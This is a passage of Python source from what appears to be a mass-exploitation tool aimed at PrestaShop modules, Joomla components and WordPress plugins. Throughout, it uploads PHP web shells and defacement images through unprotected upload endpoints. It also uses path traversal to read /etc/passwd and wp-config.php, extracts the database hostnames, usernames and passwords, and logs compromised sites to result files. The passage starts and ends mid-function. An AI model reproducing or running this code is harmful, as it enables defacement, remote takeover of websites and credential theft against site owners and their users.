                        CheckShell = requests.get('http://' + ShellPath, timeout=5)
                        if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                            self.Print_vuln_Shell(ShellPath)
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('attributewizardpro.OLD', site)
            else:
                self.Print_NotVuln('attributewizardpro.OLD', site)
        except:
            self.Print_NotVuln('attributewizardpro.OLD', site)

    def attributewizardpro_x(self, site):
        try:
            Exp = site + '/modules/attributewizardpro_x/file_upload.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
            if self.Jce_Deface_image.split('/')[1] in GoT.text.encode('utf-8'):
                Index = GoT.text.encode('utf-8').split('|||')[0]
                print Index
                IndexPath = site + '/modules/attributewizardpro_x/file_uploads/' + Index
                CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    Got2 = requests.post('http://' + Exp, files=FileDataShell, timeout=5)
                    if self.ShellPresta.split('/')[1] in GoT.text.encode('utf-8'):
                        Shell = Got2.text.encode('utf-8').split('|||')[0]
                        ShellPath = site + '/modules/attributewizardpro_x/file_uploads/' + Shell
                        CheckShell = requests.get('http://' + ShellPath, timeout=5)
                        if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                            self.Print_vuln_Shell(ShellPath)
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('attributewizardpro_x', site)
            else:
                self.Print_NotVuln('attributewizardpro_x', site)
        except:
            self.Print_NotVuln('attributewizardpro_x', site)

    def advancedslider(self, site):
        try:
            Exp = site + '/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php'
            Checkvuln = requests.get('http://' + Exp, timeout=5)
            FileDataIndex = {'qqfile': open(self.Jce_Deface_image, 'rb')}
            if Checkvuln.status_code == 200:
                requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
                IndexPath = site + '/modules/advancedslider/uploads/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                else:
                    self.Print_NotVuln('advancedslider', site)
            else:
                self.Print_NotVuln('advancedslider', site)
        except:
            self.Print_NotVuln('advancedslider', site)

    def cartabandonmentpro(self, site):
        try:
            Exp = site + '/modules/cartabandonmentpro/upload.php'
            Checkvuln = requests.get('http://' + Exp, timeout=5)
            FileDataIndex = {'image': open(self.Jce_Deface_image, 'rb')}
            if Checkvuln.status_code == 200:
                requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
                IndexPath = site + '/modules/cartabandonmentpro/uploads/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                else:
                    self.Print_NotVuln('cartabandonmentpro', site)
            else:
                self.Print_NotVuln('cartabandonmentpro', site)
        except:
            self.Print_NotVuln('cartabandonmentpro', site)

    def cartabandonmentproOld(self, site):
        try:
            Exp = site + '/modules/cartabandonmentproOld/upload.php'
            Checkvuln = requests.get('http://' + Exp, timeout=5)
            FileDataIndex = {'image': open(self.Jce_Deface_image, 'rb')}
            if Checkvuln.status_code == 200:
                requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
                IndexPath = site + '/modules/cartabandonmentproOld/uploads/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                else:
                    self.Print_NotVuln('cartabandonmentproOld', site)
            else:
                self.Print_NotVuln('cartabandonmentproOld', site)
        except:
            self.Print_NotVuln('cartabandonmentproOld', site)

    def videostab(self, site):
        try:
            Exp = site + '/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload'
            Checkvuln = requests.get('http://' + Exp, timeout=5)
            FileDataIndex = {'qqfile': open(self.Jce_Deface_image, 'rb')}
            if Checkvuln.status_code == 200:
                requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
                IndexPath = site + '/modules/videostab/uploads/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                else:
                    self.Print_NotVuln('videostab', site)
            else:
                self.Print_NotVuln('videostab', site)
        except:
            self.Print_NotVuln('videostab', site)

    def wg24themeadministration(self, site):
        Exl = site + '/modules/wg24themeadministration/wg24_ajax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                PostData = {'data': 'bajatax',
                            'type': 'pattern_upload'}
                FileDataIndex = {'bajatax': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'bajatax': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/wg24themeadministration/img/upload/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/wg24themeadministration/img/upload/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, data=PostData, timeout=5)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, data=PostData, timeout=5)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5)
                    if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('wg24themeadministration', site)
            else:
                self.Print_NotVuln('wg24themeadministration', site)
        except:
            self.Print_NotVuln('wg24themeadministration', site)


    def fieldvmegamenu(self, site):
        Exl = site + '/modules/fieldvmegamenu/ajax/upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'images[]': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'images[]': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/fieldvmegamenu/uploads/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/fieldvmegamenu/uploads/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5)
                    if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('fieldvmegamenu', site)
            else:
                self.Print_NotVuln('fieldvmegamenu', site)
        except:
            self.Print_NotVuln('fieldvmegamenu', site)

    def wdoptionpanel(self, site):
        Exl = site + '/modules/wdoptionpanel/wdoptionpanel_ajax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                PostData = {'data': 'bajatax',
                            'type': 'image_upload'}
                FileDataIndex = {'bajatax': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'bajatax': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/wdoptionpanel/upload/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/wdoptionpanel/upload/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, data=PostData, timeout=5)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, data=PostData, timeout=5)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5)
                    if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('wdoptionpanel', site)
            else:
                self.Print_NotVuln('wdoptionpanel', site)
        except:
            self.Print_NotVuln('wdoptionpanel', site)


    def pk_flexmenu(self, site):
        Exl = site + '/modules/pk_flexmenu/ajax/upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'images[]': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'images[]': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/pk_flexmenu/uploads/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/pk_flexmenu/uploads/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5)
                    if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('pk_flexmenu', site)
            else:
                self.Print_NotVuln('pk_flexmenu', site)
        except:
            self.Print_NotVuln('pk_flexmenu', site)


    def nvn_export_orders(self, site):
        Exl = site + '/modules/nvn_export_orders/upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'images[]': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'images[]': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/nvn_export_orders/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/nvn_export_orders/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5)
                    if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('nvn_export_orders', site)
            else:
                self.Print_NotVuln('nvn_export_orders', site)
        except:
            self.Print_NotVuln('nvn_export_orders', site)

    def megamenu(self, site):
        try:
            Exp = site + '/modules/megamenu/uploadify/uploadify.php?id=pwn'
            Checkvuln = requests.get('http://' + Exp, timeout=5)
            FileDataIndex = {'Filedata': open(self.Jce_Deface_image, 'rb')}
            if Checkvuln.status_code == 200:
                requests.post('http://' + Exp, files=FileDataIndex, timeout=5)
                IndexPath = site + '/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(IndexPath)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                else:
                    self.Print_NotVuln('megamenu', site)
            else:
                self.Print_NotVuln('megamenu', site)
        except:
            self.Print_NotVuln('megamenu', site)



    def tdpsthemeoptionpanel(self, site):
        Exl = site + '/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'image_upload': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'image_upload': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/tdpsthemeoptionpanel/upload/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/tdpsthemeoptionpanel/upload/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5)
                    if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('tdpsthemeoptionpanel', site)
            else:
                self.Print_NotVuln('tdpsthemeoptionpanel', site)
        except:
            self.Print_NotVuln('tdpsthemeoptionpanel', site)

    def psmodthemeoptionpanel(self, site):
        Exl = site + '/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'image_upload': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'image_upload': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/psmodthemeoptionpanel/upload/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/psmodthemeoptionpanel/upload/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5)
                    if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('psmodthemeoptionpanel', site)
            else:
                self.Print_NotVuln('psmodthemeoptionpanel', site)
        except:
            self.Print_NotVuln('psmodthemeoptionpanel', site)


    def lib(self, site):
        Exl = site + '/modules/lib/redactor/file_upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'file': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'file': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/masseditproduct/uploads/file/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/masseditproduct/uploads/file/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5)
                    if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('lib', site)
            else:
                self.Print_NotVuln('lib', site)
        except:
            self.Print_NotVuln('lib', site)

    def Com_Jbcatalog(self, site):
        Check = requests.get('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php', timeout=10)
        if Check.status_code == 200:
            ShellFile = {'files[]': open(self.ShellPresta, 'rb')}
            requests.post('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php',
                                files=ShellFile)
            CheckShell = requests.get('http://' + site +
                                      '/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php', timeout=5)

            if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                self.Print_vuln_Shell(site + '/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php')
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php\n')
            else:
                ShellFile = {'files[]': open(self.Jce_Deface_image, 'rb')}
                requests.post('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php',
                              files=ShellFile)

                CheckIndex = requests.get('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/'
                                                             'php/files/' + self.Jce_Deface_image.split('/')[1])
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/components/com_jbcatalog/libraries/jsupload/server/php/files/'
                                          + self.Jce_Deface_image.split('/')[1])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/components/com_jbcatalog/libraries/jsupload/server/php/files/'
                                     + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_Jbcatalog', site)
        else:
            self.Print_NotVuln('Com_Jbcatalog', site)



    def Com_SexyContactform(self, site):
        Check = requests.get('http://' + site + '/components/com_sexycontactform/fileupload/', timeout=10)
        if Check.status_code == 200:
            IndeX = {'files[]': open(self.Jce_Deface_image, 'rb')}
            ShellFile = {'files[]': open(self.ShellPresta, 'rb')}
            requests.post('http://' + site + '/components/com_sexycontactform/fileupload/',
                                files=ShellFile, timeout=10)
            CheckShell = requests.get('http://' + site +
                                      '/components/com_sexycontactform/fileupload/files/up.php', timeout=5)

            if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                self.Print_vuln_Shell(site + '/components/com_sexycontactform/fileupload/files/up.php')
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/components/com_sexycontactform/fileupload/files/up.php\n')
            else:
                requests.post('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php',
                              files=IndeX)

                CheckIndex = requests.get('http://' + site + '/components/com_sexycontactform/fileupload/files/'
                                          + self.Jce_Deface_image.split('/')[1])
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/components/com_sexycontactform/fileupload/files/'
                                          + self.Jce_Deface_image.split('/')[1])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/components/com_sexycontactform/fileupload/files/'
                                     + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_SexyContactform', site)
        else:
            self.Print_NotVuln('Com_SexyContactform', site)


    def Com_rokdownloads(self, site):
        Check = requests.get('http://' + site + '/administrator/components/com_rokdownloads/assets/uploadhandler.php',
                             timeout=10)
        if Check.status_code == 200 or Check.status_code == 500:
            IndeX = {'files[]': open(self.Jce_Deface_image, 'rb')}

            ShellFile = {'files[]': open(self.ShellPresta, 'rb')}
            Datapost = {'jpath': '../../../../'}
            requests.post('http://' + site + '/administrator/components/com_rokdownloads/assets/uploadhandler.php',
                                files=ShellFile, data=Datapost, timeout=10)
            CheckShell = requests.get('http://' + site +
                                      '/images/stories/up.php', timeout=5)

            if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                self.Print_vuln_Shell(site + '/images/stories/up.php')
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/images/stories/up.php\n')
            else:
                requests.post('http://' + site + '/administrator/components/com_rokdownloads/assets/uploadhandler.php',
                              files=IndeX, data=Datapost, timeout=10)

                CheckIndex = requests.get('http://' + site + '/images/stories/' + self.Jce_Deface_image.split('/')[1])
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/images/stories/' + self.Jce_Deface_image.split('/')[1])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/images/stories/' + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_rokdownloads', site)
        else:
            self.Print_NotVuln('Com_rokdownloads', site)

    def wp_miniaudioplayer(self, site):
        CheckVuln = requests.get('http://' + site, timeout=10)
        if 'wp-miniaudioplayer' in CheckVuln.text.encode('utf-8'):
            etc = requests.get('http://' + site +
                         '/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd', timeout=5)
            if 'nologin' in etc.text.encode('utf-8'):
                with open('result/Passwd_file.text', 'a') as writer:
                    writer.write('---------------------------\nSite: ' + site + '\n' + etc.text.encode('utf-8') + '\n')
                self.Print_Vuln('wp-miniaudioplayer', site)
            else:
                self.Print_NotVuln('wp-miniaudioplayer', site)
        else:
            self.Print_NotVuln('wp-miniaudioplayer', site)


    def wp_support_plus_responsive_ticket_system(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/' \
                  'downloadAttachment.php?path=../../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'DB_PASSWORD' in GetConfig.text.encode('utf-8'):
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text.encode('utf-8'))
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)
            else:
                self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)
        except:
            self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)

    def eshop_magic(self, site):
        try:
            Exp = 'http://' + site + \
                  'wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'DB_PASSWORD' in GetConfig.text.encode('utf-8'):
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text.encode('utf-8'))
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('eshop-magic', site)
            else:
                self.Print_NotVuln('eshop-magic', site)
        except:
            self.Print_NotVuln('eshop-magic', site)

    def ungallery(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/ungallery/source_payload3.php?pic=../../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'DB_PASSWORD' in GetConfig.text.encode('utf-8'):
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text.encode('utf-8'))
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text.encode('utf-8'))
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('ungallery', site)
            else:
                self.Print_NotVuln('ungallery', site)
        except:
            self.Print_NotVuln('ungallery', site)


    def Com_extplorer(self, site):
        Check = requests.get('http://' + site + '/administrator/components/com_extplorer/uploadhandler.php',
                             timeout=10)
        if Check.status_code == 200 or Check.status_code == 500:
            IndeX = {'Filedata': open(self.Jce_Deface_image, 'rb')}

            ShellFile = {'Filedata': open(self.ShellPresta, 'rb')}
            requests.post('http://' + site + '/administrator/components/com_extplorer/uploadhandler.php',
                                files=ShellFile, timeout=10)
            CheckShell = requests.get('http://' + site +
                                      '/images/stories/up.php', timeout=5)

            if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                self.Print_vuln_Shell(site + '/images/stories/up.php')
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/images/stories/up.php\n')
            else:
                requests.post('http://' + site + '/administrator/components/com_extplorer/uploadhandler.php',
                              files=IndeX, timeout=10)

                CheckIndex = requests.get('http://' + site + '/images/stories/' + self.Jce_Deface_image.split('/')[1])
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/images/stories/' + self.Jce_Deface_image.split('/')[1])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/images/stories/' + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_extplorer', site)
        else:
            self.Print_NotVuln('Com_extplorer', site)

    def Com_jwallpapers_index(self, site):
        try:
            fileindex = {'file': open(self.Jce_Deface_image, 'rb')}
            post_data = {"name": self.Jce_Deface_image.split('/')[1],
                         "submit": "Upload"}
            Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=5)
            if '"jsonrpc"' in GoT.text.encode('utf-8'):
                Check = requests.get('http://' + site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1], timeout=5)
                if 'GIF89a' in Check.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_jwallpapers', site)
        except:
            self.Print_NotVuln('Com_jwallpapers', site)

    def Com_jwallpapers_Shell(self, site):
        try:
            fileindex = {'file': open(self.indeX, 'rb')}
            post_data = {"name": "payload3.php",
                         "submit": "Upload"}
            Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=5)
            if '"jsonrpc"' in GoT.text.encode('utf-8'):
                requests.post(Exp, files=fileindex, data={"name": "payload3.php"}, timeout=5)
                requests.post(Exp, files=fileindex, data={"name": "vuln.phtml"}, timeout=5)
                Check = requests.get('http://' + site + '/tmp/plupload/payload3.php', timeout=5)
                Check2 = requests.get('http://' + site + '/tmp/plupload/payload3.php', timeout=5)
                Check3 = requests.get('http://' + site + '/tmp/plupload/vuln.phtml', timeout=5)
                CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                CheckShell = requests.get('http://' + site + '/images/payload3.php', timeout=5)

                if 'Vuln!!' in Check.text.encode('utf-8'):
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/images/payload3.php' + '\n')
                    if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/br4in.htm')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Com_jwallpapers_index(site)
                elif 'Vuln!!' in Check2.text.encode('utf-8'):
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/images/payload3.php' + '\n')
